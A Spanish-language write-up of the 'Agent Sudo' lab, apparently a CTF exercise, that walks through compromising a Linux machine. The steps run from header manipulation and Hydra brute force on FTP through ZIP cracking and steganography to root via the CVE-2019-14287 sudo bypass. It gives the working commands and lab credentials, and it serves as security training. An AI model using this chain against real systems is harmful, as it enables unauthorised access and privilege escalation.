# Agent Sudo

## 🖥️ Sistema

Linux

---

## 🎯 Objetivo del laboratorio

Comprometer una máquina Linux manipulando cabeceras HTTP para obtener acceso inicial, recuperar credenciales ocultas mediante distintas técnicas de análisis de archivos y esteganografía, acceder al sistema por **SSH** y escalar privilegios explotando una mala configuración de **sudo**.

---

## 🛠️ Tecnologías trabajadas

- Burp Suite
- HTTP Headers
- Hydra
- FTP
- Binwalk
- John the Ripper
- Base64
- Steghide
- SSH
- Sudo
- CVE-2019-14287

---

## 🧠 Metodología

La enumeración inicial mostró tres servicios expuestos: **HTTP**, **FTP** y **SSH**. Aunque el acceso final sería mediante SSH, la aplicación web era el punto de entrada más prometedor, ya que respondía de forma diferente según la información enviada por el cliente.

Durante el análisis observé que la aplicación modificaba su comportamiento dependiendo del valor de la cabecera **User-Agent**. En lugar de centrarme únicamente en la URL o en los parámetros visibles, decidí manipular las cabeceras HTTP utilizando Burp Suite, obteniendo acceso a un recurso oculto que proporcionó un nombre de usuario válido.

Con ese usuario lancé un ataque de fuerza bruta sobre el servicio FTP. Una vez obtenido el acceso comenzó una cadena de extracción de información en varias capas: análisis de imágenes, extracción de archivos ocultos, descifrado de archivos comprimidos, decodificación Base64 y esteganografía. Cada paso proporcionaba la información necesaria para continuar con el siguiente hasta recuperar unas credenciales válidas para SSH.

Finalmente, la escalada de privilegios se basó en una configuración vulnerable de **sudo** afectada por la **CVE-2019-14287**, permitiendo obtener acceso como **root** sin necesidad de conocer la contraseña del administrador.

Este laboratorio demuestra la importancia de analizar todos los vectores disponibles y seguir cuidadosamente la información obtenida en cada fase de la explotación.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé realizando un escaneo completo mediante Nmap.

```bash
nmap -p- 10.130.165.134
```

Posteriormente ejecuté una enumeración más detallada.

```bash
nmap -sC -sV -p21,22,80 10.130.165.134
```

Se identificaron los siguientes servicios:

| Puerto | Servicio |
|---------|----------|
| 21 | FTP |
| 22 | SSH |
| 80 | HTTP |

La aplicación web se convirtió en el principal objetivo de la fase de reconocimiento.

---

### 2. Enumeración web

Durante las pruebas observé que el servidor modificaba su comportamiento dependiendo del valor enviado en la cabecera:

```
User-Agent
```

Intercepté una petición utilizando **Burp Suite** y sustituí el valor por:

```
User-Agent: C
```

El servidor respondió mostrando un nuevo recurso:

```
agent_C_attention.php
```

En dicha página apareció un usuario válido:

```
chris
```

---

### 3. Acceso al servidor FTP

Con el usuario obtenido lancé un ataque de fuerza bruta utilizando Hydra.

```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.130.165.134
```

Las credenciales recuperadas fueron:

```
chris:crystal
```

Tras acceder al servidor FTP encontré varios archivos, entre ellos imágenes que ocultaban información.

---

### 4. Extracción de información

El proceso de recuperación de credenciales requirió varias fases consecutivas.

#### Extracción de archivos ocultos

Comencé utilizando Binwalk.

```bash
binwalk -e cutie.png
```

La extracción reveló un archivo ZIP oculto.

---

#### Recuperación de la contraseña del ZIP

Generé un hash compatible con John the Ripper.

```bash
zip2john 8702.zip > zip.hashes
```

Posteriormente recuperé la contraseña.

```bash
john zip.hashes
```

Resultado:

```
alien
```

---

#### Decodificación Base64

Durante la investigación apareció la cadena:

```
QXJlYTUx
```

La decodifiqué utilizando:

```bash
echo QXJlYTUx | base64 -d
```

Resultado:

```
Area51
```

---

#### Esteganografía

Finalmente utilicé Steghide sobre la imagen restante.

```bash
steghide extract -sf cute-alien.jpg
```

La extracción devolvió las credenciales:

```
james:hackerrules!
```

---

### 5. Acceso inicial

Con las nuevas credenciales inicié sesión mediante SSH.

```bash
ssh james@10.130.165.134
```

Una vez autenticado recuperé la flag de usuario y comencé la enumeración interna.

---

### 6. Escalada de privilegios

El siguiente paso consistió en revisar los permisos disponibles.

```bash
sudo -l
```

La configuración mostraba una vulnerabilidad correspondiente a:

```
CVE-2019-14287
```

Esta vulnerabilidad permite eludir determinadas restricciones de `sudo` utilizando un identificador de usuario especial.

La explotación consistió en ejecutar:

```bash
sudo -u#-1 /bin/bash
```

El comando proporcionó inmediatamente una shell como **root**.

Finalmente recuperé la última flag del laboratorio.

---

## 📚 Lecciones aprendidas

- Este laboratorio permitió practicar una cadena de explotación muy completa que combina técnicas de reconocimiento web, análisis de archivos y escalada de privilegios.
- Manipular cabeceras HTTP utilizando **Burp Suite**.
- Comprender cómo el servidor puede modificar su comportamiento dependiendo del **User-Agent**.
- Utilizar Hydra para realizar fuerza bruta sobre FTP.
- Extraer archivos ocultos mediante **Binwalk**.
- Recuperar contraseñas de archivos ZIP utilizando **John the Ripper**.
- Decodificar información codificada en Base64.
- Extraer información oculta mediante **Steghide**.
- Aprovechar la vulnerabilidad **CVE-2019-14287** para escalar privilegios con `sudo`.

### Reflexión

La principal enseñanza de este laboratorio fue comprobar cómo una explotación puede construirse a partir de múltiples pequeñas evidencias. Ninguna técnica por sí sola proporcionaba acceso completo al sistema; fue necesario combinar la manipulación de cabeceras HTTP, el análisis de archivos, la recuperación de contraseñas, la esteganografía y el acceso mediante SSH para completar la cadena de ataque. Además, el laboratorio permitió conocer una vulnerabilidad real de **sudo** (**CVE-2019-14287**), reforzando la importancia de revisar tanto las configuraciones de privilegios como las versiones de los componentes instalados durante una auditoría.
